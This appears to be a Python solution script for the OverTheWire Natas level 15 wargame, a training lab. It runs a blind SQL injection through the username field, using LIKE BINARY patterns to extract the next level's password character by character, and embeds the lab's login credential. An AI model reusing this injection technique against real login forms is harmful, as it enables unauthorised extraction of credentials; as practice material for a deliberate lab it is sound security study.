from requests.auth import HTTPBasicAuth
import requests

# alphaNum = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

# charsInPass = []

# for char in alphaNum:
#     print(f"natas16\" and password like \"{char}")
#     r = requests.post("http://natas15.natas.labs.overthewire.org/index.php", data={"username":f"natas16\" and password like \"%{char}%"}, auth = HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
#     if "This user doesn't exist" not in r.text:
#         charsInPass.append(char)

charsInPass = ['a', 'b', 'c', 'e', 'h', 'i', 'j', 'm', 'n', 'o', 'p', 'q', 
                'r', 't', 'w', 'A', 'B', 'C', 'E', 'H', 'I', 'J', 'M', 'N', 
                'O', 'P', 'Q', 'R', 'T', 'W', '0', '3', '5', '6', '9']


password = ''
for i in range(0, 35):
    spaces = '_'*i
    for char in charsInPass:
        r = requests.post("http://natas15.natas.labs.overthewire.org/index.php", data={"username":f"natas16\" and password like BINARY \"{password}{char}%"}, auth = HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
        if "This user doesn't exist" not in r.text:
            password+=char
            print(password)
            break


print(password)